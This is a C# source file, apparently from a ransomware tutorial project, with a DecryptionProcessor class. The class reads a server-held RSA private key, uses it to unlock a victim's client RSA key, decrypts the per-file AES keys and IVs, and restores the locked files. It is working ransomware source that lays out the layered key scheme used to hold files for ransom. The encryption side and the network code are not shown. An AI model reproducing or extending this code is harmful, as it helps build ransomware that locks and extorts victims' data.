using RansomwareTutorial.Helpers;
using RansomwareTutorial.Models;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace RansomwareTutorial.Controllers
{
    public static class DecryptionProcessor
    {
        public static string GetPrivateKeyFromServer(string serverRsaPrivateKeyLocation, ref bool isHealthy)
        {
            if (!isHealthy)
                return null;

            var rsaServerPrivateKey = File.ReadAllText(serverRsaPrivateKeyLocation);
            return rsaServerPrivateKey;
        }

        public static void LocateClientPrivateKeyAndDecrypt(string clientRsaPrivateKeyLocation, string rsaServerPrivateKey, ref bool isHealthy)
        {
            if (!isHealthy)
                return;

            var clientRsaPrivateKey = File.ReadAllBytes(clientRsaPrivateKeyLocation);

            var privateKeyEncrypted = CryptoHelper.DecryptLongRSA(clientRsaPrivateKey, rsaServerPrivateKey);
            File.WriteAllBytes(clientRsaPrivateKeyLocation, privateKeyEncrypted);
        }

        public static void DecryptAESKeys(string aesLocation, string clientRsaPrivateKeyLocation, ref bool isHealthy)
        {
            if (!isHealthy)
                return;

            var aesKeysLocations = Directory.GetFiles(aesLocation, "*", SearchOption.TopDirectoryOnly);
            var rsaServerPrivateKey = File.ReadAllText(clientRsaPrivateKeyLocation);

            foreach (var file in aesKeysLocations)
            {
                var aesEncrypted = CryptoHelper.DecryptRSA(File.ReadAllBytes(file), rsaServerPrivateKey);
                File.WriteAllBytes(file, aesEncrypted);
            }
        }

        public static void DecryptLockedFiles(string aesLocation, string lockedDataLocation, ref bool isHealthy)
        {
            if (!isHealthy)
                return;

            var filesLocked = Directory.GetFiles(lockedDataLocation, "*", SearchOption.TopDirectoryOnly);

            foreach (var file in filesLocked)
            {
                byte[] key = File.ReadAllBytes(Path.Combine(aesLocation, "AES_KEY-" + Path.GetFileNameWithoutExtension(file) + ".txt"));
                byte[] iv = File.ReadAllBytes(Path.Combine(aesLocation, "AES_IV-" + Path.GetFileNameWithoutExtension(file) + ".txt"));

                var aesKey = CryptoHelper.GenerateAESKey(key, iv);
                var decryptor = aesKey.CreateDecryptor();
                var fileBytes = File.ReadAllBytes(file);
                CryptoHelper.CryptoTransformAES(decryptor, file, fileBytes, lockedDataLocation);
            }
        }
    
    }
}
